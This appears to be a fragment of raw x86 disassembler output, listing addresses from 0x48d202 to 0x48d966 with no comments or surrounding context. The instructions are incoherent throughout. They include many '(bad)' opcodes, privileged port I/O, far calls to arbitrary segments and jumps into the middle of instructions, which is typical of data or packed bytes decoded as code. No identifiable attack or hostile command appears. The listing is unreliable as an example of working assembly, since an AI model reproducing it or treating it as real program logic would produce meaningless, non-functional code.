  48d202:	adc    ecx,DWORD PTR [ebx+edi*1-0x7e]
  48d206:	add    edx,DWORD PTR [edx]
  48d208:	push   ss
  48d209:	cmp    eax,0xe4aef217
  48d20e:	inc    edx
  48d20f:	sar    dl,1
  48d211:	rol    BYTE PTR [ebx+0x3],1
  48d214:	adc    bl,BYTE PTR [esi-0x44f7ff32]
  48d21a:	add    BYTE PTR [ecx+eax*4+0x444583ad],0x17
  48d222:	bnd je 0x48d210
  48d225:	or     DWORD PTR [edi-0x14ba2728],0xffffff82
  48d22c:	loopne 0x48d27a
  48d22e:	push   es
  48d22f:	dec    eax
  48d230:	es clc 
  48d232:	jns    0x48d27b
  48d234:	ja     0x48d264
  48d236:	in     al,0xa0
  48d238:	mov    al,ds:0x4646a0d2
  48d23d:	push   eax
  48d23e:	push   edx
  48d23f:	ret    0x6186
  48d242:	cmc    
  48d243:	push   ecx
  48d244:	pop    eax
  48d245:	jb     0x48d1dc
  48d247:	pop    esp
  48d248:	inc    edi
  48d249:	dec    eax
  48d24a:	push   es
  48d24b:	mov    dh,0xa
  48d24d:	inc    ebx
  48d24e:	addr16 loope 0x48d29a
  48d251:	fadd   DWORD PTR [edx+0x496710c2]
  48d257:	stos   DWORD PTR es:[edi],eax
  48d258:	or     al,BYTE PTR [ebx+0x18]
  48d25b:	dec    edx
  48d25c:	xor    BYTE PTR [bp+si+0x42],dl
  48d260:	xchg   edx,eax
  48d261:	dec    ebx
  48d262:	int    0x4f
  48d264:	xchg   DWORD PTR [esp+ebx*2-0x4f4ff2b4],eax
  48d26b:	pop    esp
  48d26c:	leave  
  48d26d:	jl     0x48d290
  48d26f:	dec    ebp
  48d270:	add    BYTE PTR [esi],al
  48d272:	and    al,BYTE PTR [eax+0x17]
  48d275:	jb     0x48d1f7
  48d277:	push   sp
  48d279:	test   al,0xe4
  48d27b:	test   al,0x4e
  48d27d:	ret    0x1410
  48d280:	js     0x48d2c3
  48d282:	inc    esp
  48d283:	xor    BYTE PTR [ecx+eax*4+0x4f836dad],al
  48d28a:	inc    ebx
  48d28b:	mov    eax,0x476daad8
  48d290:	push   eax
  48d291:	popa   
  48d292:	pusha  
  48d293:	or     ecx,DWORD PTR [edx]
  48d295:	ins    DWORD PTR es:[edi],dx
  48d296:	dec    ecx
  48d297:	push   ecx
  48d298:	push   cs
  48d299:	mov    dh,0x2a
  48d29b:	or     al,0x6d
  48d29d:	inc    ebx
  48d29e:	push   edx
  48d29f:	pop    eax
  48d2a0:	mov    dl,al
  48d2a2:	adc    BYTE PTR [ebp+0x4b],ch
  48d2a5:	and    DWORD PTR [edx],ecx
  48d2a7:	inc    ebx
  48d2a8:	sbb    BYTE PTR [ebx+0x6d],dl
  48d2ab:	sub    cl,BYTE PTR [ecx+eiz*2]
  48d2ae:	pusha  
  48d2af:	dec    ebx
  48d2b0:	push   esp
  48d2b1:	ins    DWORD PTR es:[edi],dx
  48d2b2:	pop    esp
  48d2b3:	enter  0x70d3,0x10
  48d2b7:	enter  0x3888,0x38
  48d2bb:	push   ebp
  48d2bc:	sbb    eax,0x47780903
  48d2c1:	fstp   DWORD PTR [eax-0x186f41c0]
  48d2c7:	dec    esp
  48d2c8:	inc    eax
  48d2c9:	inc    eax
  48d2ca:	push   esi
  48d2cb:	add    BYTE PTR [eax],dl
  48d2cd:	and    DWORD PTR [edi-0x63],ecx
  48d2d0:	inc    ecx
  48d2d1:	aaa    
  48d2d2:	push   ebp
  48d2d3:	dec    eax
  48d2d4:	adc    al,0x48
  48d2d6:	mov    ah,0xb0
  48d2d8:	mov    ch,0x73
  48d2da:	push   edi
  48d2db:	push   ebp
  48d2dc:	hlt    
  48d2dd:	das    
  48d2de:	mov    eax,0xf217034b
  48d2e3:	mov    eax,0xd9b22b58
  48d2e8:	imul   ecx,DWORD PTR [eax],0xf85980
  48d2ee:	clc    
  48d2ef:	add    BYTE PTR [esi],ch
  48d2f1:	out    dx,al
  48d2f2:	cmp    dl,BYTE PTR [ebx]
  48d2f4:	pop    ecx
  48d2f5:	and    eax,DWORD PTR [esi+esi*2]
  48d2f8:	shr    BYTE PTR [eax],0x87
  48d2fb:	or     edi,DWORD PTR [ecx-0x40]
  48d2fe:	pop    edx
  48d2ff:	in     eax,dx
  48d300:	mov    eax,0x815ba790
  48d305:	ror    eax,cl
  48d307:	enter  0x195b,0xc2
  48d30b:	dec    esi
  48d30c:	sbb    dl,BYTE PTR [ecx-0x7c]
  48d30f:	sbb    BYTE PTR [eax+edx*1+0x79],0x5c
  48d314:	das    
  48d315:	mov    ecx,0x5de7a620
  48d31a:	mov    WORD PTR [edi+0x6f],gs
  48d31d:	fiadd  DWORD PTR [ebx+0x70cc1f42]
  48d323:	pop    ds
  48d324:	adc    BYTE PTR [esi],0xb8
  48d327:	dec    eax
  48d328:	push   ds
  48d329:	push   eax
  48d32a:	mov    eax,ds:0xda7c3f70
  48d32f:	rol    DWORD PTR [ecx],0x90
  48d332:	cmp    al,0x14
  48d334:	(bad)  [ecx]
  48d336:	loop   0x48d2c9
  48d338:	or     ah,bl
  48d33a:	and    eax,0x42b02cf2
  48d33f:	rcr    DWORD PTR cs:0xb00b7022,0xc5
  48d347:	(bad)  
  48d348:	mov    ebp,0xe7f6f4ff
  48d34d:	imul   edi,DWORD PTR [esi],0x6db1ced
  48d353:	mov    ah,0xc
  48d355:	fsubr  st(0),st
  48d357:	clc    
  48d358:	mov    dh,0x84
  48d35a:	cmp    ebx,ebx
  48d35c:	js     0x48d337
  48d35e:	xchg   BYTE PTR [edx+ebx*8+0x6],bl
  48d362:	push   cs
  48d363:	dec    ebx
  48d364:	pop    eax
  48d365:	lods   al,BYTE PTR ds:[esi]
  48d366:	xchg   ebp,eax
  48d367:	or     esi,DWORD PTR [esi]
  48d369:	out    dx,eax
  48d36a:	pop    esp
  48d36b:	enter  0xb422,0x7
  48d36f:	sub    DWORD PTR [ecx],edi
  48d371:	ror    BYTE PTR [esi],cl
  48d373:	cs mov eax,0xe78a88a0
  48d379:	or     eax,0x427bb15b
  48d37e:	nop
  48d37f:	fs jno 0x48d3c2
  48d382:	add    DWORD PTR [esi],edi
  48d384:	xchg   DWORD PTR [eax+0x89f8590],esp
  48d38a:	push   esp
  48d38b:	mov    dh,0x84
  48d38d:	nop
  48d38e:	sbb    DWORD PTR [ebp-0x2],ebx
  48d391:	scas   eax,DWORD PTR es:[edi]
  48d392:	loope  0x48d3e1
  48d394:	lods   al,BYTE PTR ds:[esi]
  48d395:	mov    ebx,0xcf7287ec
  48d39a:	(bad)  
  48d39b:	mov    al,es:0xc553c0d
  48d3a1:	out    0x54,eax
  48d3a3:	fild   WORD PTR [ebp+ebp*2+0x3c]
  48d3a7:	adc    BYTE PTR [edi+0x44ddfc1f],al
  48d3ad:	inc    ebx
  48d3ae:	sub    BYTE PTR [ebx],dl
  48d3b0:	and    ecx,DWORD PTR [edi]
  48d3b2:	cmp    BYTE PTR [ecx-0x7d],ch
  48d3b5:	mov    al,0x6
  48d3b7:	mov    ds:0x1d070f8e,al
  48d3bc:	dec    eax
  48d3bd:	inc    edi
  48d3be:	test   al,0x47
  48d3c0:	adc    BYTE PTR ds:0xc212c0f,ch
  48d3c6:	xor    BYTE PTR [esi+edi*1+0x7e],dh
  48d3ca:	je     0x48d404
  48d3cc:	test   BYTE PTR cs:[eax-0x6f6ebf38],0x7e
  48d3d4:	pop    esp
  48d3d5:	enter  0x14e6,0xaf
  48d3d9:	les    esi,FWORD PTR [edx+0x10]
  48d3dc:	jae    0x48d450
  48d3de:	adc    DWORD PTR [edx+0x2a],esi
  48d3e1:	fld    DWORD PTR [eax+0x1]
  48d3e4:	adc    cl,dh
  48d3e6:	sbb    cl,BYTE PTR [ebx+0x6]
  48d3e9:	cmp    DWORD PTR [eax],edx
  48d3eb:	out    dx,eax
  48d3ec:	push   es
  48d3ed:	imul   ebp,DWORD PTR [edx],0x9e07c164
  48d3f3:	ror    BYTE PTR [eax+eiz*1+0x70],0x72
  48d3f8:	sbb    edx,DWORD PTR [eax+0xf]
  48d3fb:	push   esp
  48d3fc:	mov    WORD PTR [eax],cs
  48d3fe:	es cwde 
  48d400:	sbb    eax,0xbe540c12
  48d405:	sbb    BYTE PTR [ecx+eax*2+0x67909923],ch
  48d40c:	pop    es
  48d40d:	and    eax,0x30c5fd2c
  48d412:	stos   BYTE PTR es:[edi],al
  48d413:	adc    DWORD PTR [ecx-0x5f],edx
  48d416:	xchg   esp,eax
  48d417:	ins    BYTE PTR es:[edi],dx
  48d418:	inc    ebp
  48d419:	dec    ebp
  48d41a:	ror    BYTE PTR [ebp+0x31],0x8f
  48d41e:	mov    ds:0xc8f8d31d,eax
  48d423:	fmul   DWORD PTR [edi-0x1395c2d6]
  48d429:	mov    ds:0xb5c2042e,al
  48d42e:	repnz or al,0xbf
  48d431:	push   edi
  48d432:	mov    ds,WORD PTR ds:0xb62c75de
  48d438:	(bad)  
  48d439:	jmp    0x48d445
  48d43b:	push   ss
  48d43c:	je     0x48d45e
  48d43e:	and    eax,0x59b674a4
  48d443:	sbb    bh,bh
  48d445:	push   eax
  48d446:	inc    ebp
  48d447:	pop    esp
  48d448:	test   al,0xec
  48d44a:	and    eax,0x235f6b7c
  48d44f:	mov    eax,0xda44a1df
  48d454:	retf   0x29e8
  48d457:	popf   
  48d458:	xor    BYTE PTR [eax+esi*1],dh
  48d45b:	push   eax
  48d45c:	es sahf 
  48d45e:	add    edx,DWORD PTR [edx+0x4c]
  48d461:	sub    esi,DWORD PTR [eax+edx*4+0x6f]
  48d465:	pop    esi
  48d466:	dec    ebx
  48d467:	adc    eax,DWORD PTR [ecx]
  48d469:	(bad)  
  48d46a:	sub    al,0x8e
  48d46c:	aam    0x1e
  48d46e:	cmp    al,0x5d
  48d470:	mov    al,ds:0x981d3bdf
  48d475:	es je  0x48d4ae
  48d478:	sbb    edi,ebp
  48d47a:	aad    0x92
  48d47c:	push   ecx
  48d47d:	je     0x48d4ab
  48d47f:	adc    ebx,DWORD PTR [esi+0x31]
  48d482:	sub    BYTE PTR [ebp-0x50],bl
  48d485:	and    ah,BYTE PTR [edi-0x13be935c]
  48d48b:	int3   
  48d48c:	dec    ebp
  48d48d:	adc    edx,eax
  48d48f:	dec    ebx
  48d490:	pop    ecx
  48d491:	inc    eax
  48d492:	adc    DWORD PTR [eax],ebx
  48d494:	and    DWORD PTR [ecx-0x25a9f830],ecx
  48d49a:	xchg   ebp,eax
  48d49b:	xchg   edx,eax
  48d49c:	(bad)  
  48d49e:	pusha  
  48d49f:	cwde   
  48d4a0:	push   ebp
  48d4a1:	clc    
  48d4a2:	push   es
  48d4a3:	lock jbe 0x48d485
  48d4a6:	jae    0x48d4fd
  48d4a8:	hlt    
  48d4a9:	mov    ds:0x7dc03321,eax
  48d4ae:	xor    DWORD PTR [ebx+ebx*4+0x1b745734],esp
  48d4b5:	mov    BYTE PTR [eax+0xa334380],dh
  48d4bb:	int3   
  48d4bc:	mov    ah,0x11
  48d4be:	adc    edi,DWORD PTR [edi-0x7c5e9e57]
  48d4c4:	inc    ebp
  48d4c5:	cld    
  48d4c6:	mov    ebx,0x6e036161
  48d4cb:	sub    eax,0x954dc44b
  48d4d0:	add    al,bl
  48d4d2:	(bad)  
  48d4d3:	sahf   
  48d4d4:	cmp    al,0xa1
  48d4d6:	lock inc esp
  48d4d8:	dec    esi
  48d4d9:	fcomi  st,st(4)
  48d4db:	stc    
  48d4dc:	pop    eax
  48d4dd:	xor    ah,BYTE PTR [edi-0x3017a0bf]
  48d4e3:	rol    BYTE PTR [edi-0x75],1
  48d4e6:	dec    ecx
  48d4e7:	lea    edi,[esp+esi*8+0x40497134]
  48d4ee:	bound  esi,QWORD PTR [edi]
  48d4f0:	sub    eax,0xff458414
  48d4f5:	ret    
  48d4f6:	pushf  
  48d4f7:	shl    DWORD PTR [esi+0x48],0x20
  48d4fb:	jmp    DWORD PTR [ecx]
  48d4fd:	jecxz  0x48d513
  48d4ff:	call   0x165d02b5
  48d504:	push   es
  48d505:	imul   eax,DWORD PTR [ebx],0x45b86000
  48d50b:	and    ecx,ecx
  48d50d:	jp     0x48d4a7
  48d50f:	sbb    BYTE PTR [esi-0x1eb558e1],bh
  48d515:	in     al,0x18
  48d517:	push   esi
  48d518:	nop
  48d519:	or     BYTE PTR [eax+eax*2-0x45],dh
  48d51d:	sar    BYTE PTR ss:[eax-0x57],1
  48d521:	cmp    BYTE PTR [esp+esi*8],ch
  48d524:	push   ebx
  48d525:	test   al,0x8
  48d527:	mov    ah,0xdd
  48d529:	in     eax,dx
  48d52a:	push   ss
  48d52b:	inc    eax
  48d52c:	cmp    eax,0x178e629c
  48d531:	mov    DWORD PTR ds:0x200feb11,ebx
  48d537:	mov    al,ds:0xb99c1ac3
  48d53c:	push   es
  48d53d:	adc    edi,ecx
  48d53f:	vpmacsdql ymm1,ymm7,YMMWORD PTR ds:0x643b0d9c,ymm2
  48d549:	jne    0x48d4cf
  48d54b:	fstp   TBYTE PTR [ebp+0x1b]
  48d54e:	lahf   
  48d54f:	je     0x48d557
  48d551:	mov    eax,ds:0x4ba1c30f
  48d556:	inc    edx
  48d557:	pop    ds
  48d558:	mov    ds:0x21d0f46,eax
  48d55d:	add    esi,0xfffffffb
  48d560:	dec    ebp
  48d561:	adc    al,0x36
  48d563:	push   edx
  48d564:	sar    DWORD PTR [ebx],cl
  48d566:	daa    
  48d567:	mov    DWORD PTR [edx],esp
  48d569:	push   ss
  48d56a:	ret    0x9867
  48d56d:	loopne 0x48d57e
  48d56f:	(bad)  
  48d570:	ror    BYTE PTR [eax+ecx*8-0x6dc4e675],0xfe
  48d578:	js     0x48d517
  48d57a:	xchg   esp,eax
  48d57b:	push   esi
  48d57c:	call   0x98fd:0xc28641c6
  48d583:	xchg   ebx,eax
  48d584:	push   edx
  48d585:	ja     0x48d5e1
  48d587:	mov    ebp,0x2900b588
  48d58c:	mov    cl,0x27
  48d58e:	sbb    DWORD PTR [eax],ecx
  48d590:	loopne 0x48d585
  48d592:	push   0xffffffb3
  48d594:	jo     0x48d5df
  48d596:	jmp    0x48d5a7
  48d598:	pop    ds
  48d599:	sub    eax,0x4808a89d
  48d59e:	(bad)  
  48d5a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48d5a1:	push   edi
  48d5a2:	sub    edi,eax
  48d5a4:	and    al,0x8e
  48d5a6:	sub    DWORD PTR [ebx],ebp
  48d5a8:	nop
  48d5a9:	ficomp DWORD PTR ds:0x4b2ba806
  48d5af:	les    edx,FWORD PTR [ebx-0x55]
  48d5b2:	test   BYTE PTR [esi],bl
  48d5b4:	mov    esi,0x34b070ff
  48d5b9:	cmp    dl,ah
  48d5bb:	fidiv  DWORD PTR [ebx-0xd]
  48d5be:	inc    eax
  48d5bf:	inc    esi
  48d5c0:	push   cs
  48d5c1:	aad    0x30
  48d5c3:	and    edx,ebp
  48d5c5:	sbb    al,0xda
  48d5c7:	(bad)  
  48d5c8:	jae    0x48d5fa
  48d5ca:	addr16 push es
  48d5cc:	loopne 0x48d5c2
  48d5ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d5cf:	fcom   st(2)
  48d5d1:	and    al,0x4f
  48d5d3:	lock mov bl,BYTE PTR ds:0x7b4476fc
  48d5da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d5db:	mov    WORD PTR [ecx],es
  48d5dd:	outs   dx,BYTE PTR ds:[esi]
  48d5de:	hlt    
  48d5df:	add    eax,DWORD PTR [eax-0xdedfe35]
  48d5e5:	pop    esp
  48d5e6:	sahf   
  48d5e7:	retf   
  48d5e8:	or     BYTE PTR [ecx+eax*1],al
  48d5eb:	or     BYTE PTR [edx],al
  48d5ed:	or     BYTE PTR [edx+0x1010e796],0x6
  48d5f4:	adc    al,dl
  48d5f6:	sbb    DWORD PTR [edx+0x61],edi
  48d5f9:	push   edi
  48d5fa:	sbb    al,0x2
  48d5fc:	inc    ecx
  48d5fd:	mov    bh,0x26
  48d5ff:	call   0x38f0b6df
  48d604:	ja     0x48d64a
  48d606:	mov    edi,0x9a5cc9b1
  48d60b:	and    BYTE PTR [ecx-0x51806f45],bh
  48d611:	out    0x44,al
  48d613:	div    DWORD PTR [edi-0x7c]
  48d616:	test   BYTE PTR [esi+0x10],0x80
  48d61a:	dec    ebx
  48d61b:	jae    0x48d686
  48d61d:	pop    es
  48d61e:	sbb    eax,0x12041110
  48d623:	out    0xd2,al
  48d625:	pop    esp
  48d626:	call   0x6a10:0x2080102
  48d62d:	loope  0x48d69c
  48d62f:	xchg   edi,eax
  48d630:	add    al,0x20
  48d632:	xchg   ecx,eax
  48d633:	add    edi,edi
  48d635:	dec    eax
  48d636:	jns    0x48d659
  48d638:	xchg   esi,esp
  48d63a:	ja     0x48d67f
  48d63c:	and    ah,bh
  48d63e:	xor    al,0xae
  48d640:	dec    ebp
  48d641:	retf   
  48d642:	iret   
  48d643:	pop    edx
  48d644:	shr    DWORD PTR ds:0xd457362c,cl
  48d64a:	or     ebp,ebp
  48d64c:	sub    DWORD PTR [eax],ecx
  48d64e:	and    eax,0x42af7792
  48d653:	push   ds
  48d654:	cwde   
  48d655:	mov    dl,0x2
  48d657:	push   es
  48d658:	das    
  48d659:	test   DWORD PTR ds:0xde565599,0xd6505bc3
  48d663:	push   eax
  48d664:	cmp    ch,bh
  48d666:	sbb    eax,0x3f024ab4
  48d66b:	sti    
  48d66c:	xchg   ecx,eax
  48d66d:	js     0x48d662
  48d66f:	and    DWORD PTR [ecx],eax
  48d671:	and    al,0x36
  48d673:	sbb    eax,0x1240b05c
  48d678:	dec    eax
  48d679:	inc    esi
  48d67a:	sbb    ecx,ebx
  48d67c:	and    DWORD PTR [ecx+eiz*1],esp
  48d67f:	cwde   
  48d680:	js     0x48d636
  48d682:	mov    ebp,edx
  48d684:	or     ch,cl
  48d686:	cmp    ebx,DWORD PTR [esi-0x67]
  48d689:	push   0xf
  48d68b:	add    al,0x18
  48d68d:	mov    cx,0x2e50
  48d691:	mov    DWORD PTR [edi+0x39],ecx
  48d694:	add    cl,ch
  48d696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d697:	or     cl,BYTE PTR [ecx+eax*8]
  48d69a:	mov    ecx,0xa122690a
  48d69f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48d6a0:	outs   dx,BYTE PTR ds:[esi]
  48d6a1:	push   ds
  48d6a2:	inc    edi
  48d6a3:	or     dh,al
  48d6a5:	mov    dl,0xcb
  48d6a7:	retf   
  48d6a8:	out    0x9c,al
  48d6aa:	call   0xc3c:0x4400c25
  48d6b1:	les    esi,FWORD PTR [esi-0x59d77ac3]
  48d6b7:	ds sub al,0x1
  48d6ba:	push   es
  48d6bb:	inc    esp
  48d6bc:	add    DWORD PTR [edx+0x1f],eax
  48d6bf:	xor    al,0xda
  48d6c1:	(bad)
  48d6c5:	enter  0x4847,0x1d
  48d6c9:	pop    es
  48d6ca:	aaa    
  48d6cb:	fcom   QWORD PTR [ebp+0x44]
  48d6ce:	sbb    DWORD PTR ds:0x8b2a3f88,ebp
  48d6d4:	dec    BYTE PTR [edx+0x71311c57]
  48d6da:	mov    eax,0x9a4ab334
  48d6df:	adc    BYTE PTR [ebx],dl
  48d6e1:	fmul   QWORD PTR [eax+esi*2]
  48d6e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48d6e5:	add    DWORD PTR [ecx-0x2bedc537],eax
  48d6eb:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  48d6ed:	add    al,BYTE PTR [eax+ecx*1+0x21]
  48d6f1:	adc    eax,eax
  48d6f3:	mov    ds:0x18a82771,eax
  48d6f8:	std    
  48d6f9:	nop
  48d6fa:	sbb    ch,0x8a
  48d6fd:	dec    edi
  48d6fe:	imul   esi,DWORD PTR [ebx+edx*2],0x4
  48d702:	jnp    0x48d755
  48d704:	mov    DWORD PTR [eax-0xf],esp
  48d707:	mov    esi,0x1b536081
  48d70c:	js     0x48d6f9
  48d70e:	or     dh,BYTE PTR [esi+0x17]
  48d711:	ror    BYTE PTR [esi+esi*1+0x54c32f16],cl
  48d718:	mov    ebp,0xfb40fc60
  48d71d:	or     ch,BYTE PTR [edx+eax*1]
  48d720:	loope  0x48d75e
  48d722:	or     edi,esi
  48d724:	sbb    esi,edx
  48d726:	jmp    0x48d76b
  48d728:	outs   dx,BYTE PTR ds:[esi]
  48d729:	je     0x48d73d
  48d72b:	mov    al,ds:0x22407a1c
  48d730:	inc    ebx
  48d731:	mov    WORD PTR [edx],es
  48d733:	dec    ecx
  48d734:	mul    DWORD PTR [ecx-0x76]
  48d737:	adc    eax,0x2bf41020
  48d73c:	xor    al,0xda
  48d73e:	das    
  48d73f:	xchg   esp,eax
  48d740:	loope  0x48d74e
  48d742:	add    edx,DWORD PTR [ebx+0x40]
  48d745:	add    al,0x48
  48d747:	les    eax,FWORD PTR [eax]
  48d749:	sahf   
  48d74a:	push   cs
  48d74b:	inc    edi
  48d74c:	cld    
  48d74d:	test   al,0x3f
  48d74f:	mov    fs,WORD PTR [ebp+ebx*8-0x32]
  48d753:	or     DWORD PTR [eax],esi
  48d755:	add    DWORD PTR [eax-0xc],edx
  48d758:	mov    es,WORD PTR ds:0x152d73a4
  48d75e:	leave  
  48d75f:	xlat   BYTE PTR ds:[ebx]
  48d760:	dec    esi
  48d761:	cmp    DWORD PTR [edi+esi*4],0xffffff81
  48d765:	ds retf 
  48d767:	add    DWORD PTR [eax+ecx*4+0x25334843],eax
  48d76e:	inc    esp
  48d76f:	dec    esp
  48d770:	dec    esp
  48d771:	inc    esi
  48d772:	xlat   BYTE PTR ds:[ebx]
  48d773:	nop
  48d774:	es daa 
  48d776:	push   edi
  48d777:	mov    WORD PTR [ebx],es
  48d779:	sub    BYTE PTR [edi+edx*8],bl
  48d77c:	dec    ebp
  48d77d:	mov    ch,0x20
  48d77f:	add    al,0xb1
  48d781:	inc    esi
  48d782:	xor    BYTE PTR fs:[ebx-0x7bd1cb44],al
  48d789:	xchg   eax,ecx
  48d78b:	sbb    cl,BYTE PTR [esi]
  48d78d:	mov    BYTE PTR [eax+0x46],bh
  48d790:	outs   dx,DWORD PTR ds:[esi]
  48d791:	lods   eax,DWORD PTR ds:[esi]
  48d792:	hlt    
  48d793:	sbb    al,BYTE PTR ds:0x478b823d
  48d799:	ds cld 
  48d79b:	dec    ecx
  48d79c:	arpl   WORD PTR [edx],di
  48d79e:	cmp    BYTE PTR [bx+si-0x54],0x16
  48d7a3:	push   ebp
  48d7a4:	pop    ds
  48d7a5:	jb     0x48d7a8
  48d7a7:	retf   0x713d
  48d7aa:	jp     0x48d815
  48d7ac:	mov    ah,0x96
  48d7ae:	xor    al,0x1e
  48d7b0:	in     eax,dx
  48d7b1:	pop    ecx
  48d7b2:	jmp    0x48d7c8
  48d7b4:	sub    ebp,DWORD PTR [edx+0x20]
  48d7b7:	(bad)  
  48d7b8:	pusha  
  48d7b9:	mov    eax,0x3be9017
  48d7be:	push   ebp
  48d7bf:	mov    ds:0x83ee82ec,eax
  48d7c4:	pop    esp
  48d7c5:	add    edx,eax
  48d7c7:	adc    BYTE PTR [ecx+esi*2],ch
  48d7ca:	les    ecx,FWORD PTR [esi+0x17b6440b]
  48d7d0:	dec    edi
  48d7d1:	fadd   st,st(4)
  48d7d3:	ret    0xa081
  48d7d6:	test   eax,0x73cf587a
  48d7db:	nop
  48d7dc:	rcl    BYTE PTR [eax+eiz*1],cl
  48d7df:	sbb    al,0x49
  48d7e1:	push   esi
  48d7e2:	inc    ecx
  48d7e3:	adc    al,BYTE PTR [esi]
  48d7e5:	inc    esi
  48d7e6:	inc    ebx
  48d7e7:	add    al,0x3a
  48d7e9:	lods   al,BYTE PTR ds:[esi]
  48d7ea:	add    esp,eax
  48d7ec:	test   eax,esi
  48d7ee:	mov    edx,DWORD PTR [edi+0x795404bb]
  48d7f4:	out    dx,al
  48d7f5:	outs   dx,DWORD PTR ds:[esi]
  48d7f6:	cmp    ax,0xffbb
  48d7fa:	push   0x8
  48d7fc:	pusha  
  48d7fd:	pusha  
  48d7fe:	mov    ds:0x86d86f01,eax
  48d803:	mov    al,0x4a
  48d805:	dec    edx
  48d806:	sbb    bl,BYTE PTR [edi]
  48d808:	clc    
  48d809:	call   0xfbb0:0x52853b02
  48d810:	pusha  
  48d811:	adc    edx,edi
  48d813:	sbb    eax,0x889986c8
  48d818:	imul   DWORD PTR [eax-0x20]
  48d81b:	fld    DWORD PTR [ecx-0x66]
  48d81e:	imul   ebp,DWORD PTR [ecx+ebx*1+0x46],0x38
  48d823:	mov    WORD PTR fs:[edi+ecx*4-0x38],ds
  48d828:	fcmovnu st,st(7)
  48d82a:	mov    DWORD PTR [ecx-0x80ba7d5],esi
  48d830:	fucomi st,st(3)
  48d832:	arpl   WORD PTR cs:[ebp+0x25],si
  48d836:	xchg   esp,eax
  48d837:	xor    eax,0x15744e40
  48d83c:	inc    ecx
  48d83d:	inc    ebx
  48d83e:	and    eax,0xfa279925
  48d843:	add    al,BYTE PTR cs:[ebx+0x51575b67]
  48d84a:	test   eax,0x2c451c4c
  48d84f:	and    bh,dh
  48d851:	jecxz  0x48d8c3
  48d853:	ins    DWORD PTR es:[edi],dx
  48d854:	shr    DWORD PTR [esi-0x41],0xf2
  48d858:	fisttp DWORD PTR [ecx+0x553c4af0]
  48d85e:	mov    dx,0x9c15
  48d862:	int    0xa0
  48d864:	pop    ecx
  48d865:	stos   DWORD PTR es:[edi],eax
  48d866:	pusha  
  48d867:	mov    esp,0xa8519080
  48d86c:	add    ebx,DWORD PTR [ebp+0x48]
  48d86f:	push   eax
  48d870:	xlat   BYTE PTR ds:[ebx]
  48d871:	je     0x48d85e
  48d873:	aas    
  48d874:	adc    al,0x11
  48d876:	adc    BYTE PTR [ebx],bl
  48d878:	xchg   esp,eax
  48d879:	mov    ds:0x93cf6443,eax
  48d87e:	mov    eax,0x92e2169
  48d883:	ins    BYTE PTR es:[edi],dx
  48d884:	add    BYTE PTR [edx],bl
  48d886:	loopne 0x48d8ca
  48d888:	push   es
  48d889:	adc    BYTE PTR [edi],cl
  48d88b:	pushf  
  48d88c:	sub    al,0x40
  48d88e:	adc    esp,DWORD PTR [eax+0x1c4acf11]
  48d894:	cmp    DWORD PTR [ecx+0x3f27dace],ebp
  48d89a:	(bad)  
  48d89c:	mov    eax,0x30481b0
  48d8a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48d8a2:	xor    al,dh
  48d8a4:	add    ecx,edx
  48d8a6:	mov    ecx,DWORD PTR [edi]
  48d8a8:	mov    edi,0x3120a476
  48d8ad:	hlt    
  48d8ae:	sbb    DWORD PTR [ebx-0x2d],edx
  48d8b1:	in     al,dx
  48d8b2:	or     dl,al
  48d8b4:	adc    BYTE PTR [esi-0x2e],0xdb
  48d8b8:	jne    0x48d88a
  48d8ba:	xor    ah,0x84
  48d8bd:	mov    ah,0xbf
  48d8bf:	(bad)  
  48d8c0:	in     al,dx
  48d8c1:	adc    DWORD PTR [eax],ebp
  48d8c3:	imul   eax
  48d8c5:	js     0x48d8e6
  48d8c7:	adc    ah,BYTE PTR [edi+0x359ea501]
  48d8cd:	or     eax,0xe8404df6
  48d8d2:	add    al,0xf
  48d8d4:	adc    DWORD PTR [esi+0x16083421],0x5a
  48d8db:	ret    
  48d8dc:	std    
  48d8dd:	or     esp,DWORD PTR [ebx]
  48d8df:	jmp    0x48d928
  48d8e1:	fs mov al,0x58
  48d8e4:	fcmovb st,st(3)
  48d8e6:	in     al,0x3a
  48d8e8:	cwde   
  48d8e9:	fidivr WORD PTR [ebp+0x40]
  48d8ec:	cmp    eax,ebx
  48d8ee:	verr   dx
  48d8f1:	ja     0x48d90a
  48d8f3:	add    al,0xf9
  48d8f5:	jmp    0x48d929
  48d8f7:	inc    ecx
  48d8f8:	inc    eax
  48d8f9:	or     ch,dh
  48d8fb:	fisub  WORD PTR [esi-0x32]
  48d8fe:	daa    
  48d8ff:	dec    eax
  48d900:	cmp    al,0x39
  48d902:	adc    DWORD PTR [esi],ebp
  48d904:	dec    edx
  48d905:	adc    BYTE PTR [esi-0x34195b6c],cl
  48d90b:	lock ins DWORD PTR es:[edi],dx
  48d90d:	arpl   sp,ax
  48d90f:	mov    ebp,0xf7f8a140
  48d914:	xchg   DWORD PTR [edi],ebp
  48d916:	mov    bl,0x5d
  48d918:	dec    esp
  48d919:	push   0xfffffff3
  48d91b:	sub    esi,DWORD PTR [ebp-0x14]
  48d91e:	cmp    BYTE PTR [ebx],0x70
  48d921:	and    BYTE PTR [ebp+0xe],bh
  48d924:	pop    ebx
  48d925:	rcl    BYTE PTR [esi],0x7f
  48d928:	test   DWORD PTR [eax],esp
  48d92a:	sub    eax,esi
  48d92c:	xor    DWORD PTR [edi+0x235c9630],edi
  48d932:	js     0x48d8fc
  48d934:	xor    eax,DWORD PTR [eax+0x7d]
  48d937:	enter  0x5282,0xb0
  48d93b:	and    ch,BYTE PTR ds:0xddd5ee5c
  48d941:	or     DWORD PTR [ebx],edi
  48d943:	jmp    0x48d98f
  48d945:	push   esi
  48d946:	inc    esi
  48d947:	sub    edx,DWORD PTR [ebp-0x5]
  48d94a:	ret    
  48d94b:	dec    esp
  48d94c:	in     eax,dx
  48d94d:	xchg   edx,eax
  48d94e:	fnstenv [edi]
  48d950:	and    eax,0x114b2403
  48d955:	cwde   
  48d956:	push   edx
  48d957:	mov    dl,BYTE PTR [ecx+0x130c1471]
  48d95d:	mov    ch,0xdb
  48d95f:	jb     0x48d9c5
  48d961:	or     DWORD PTR [ecx],0xfffffffa
  48d964:	and    edx,edx
  48d966:	pusha  
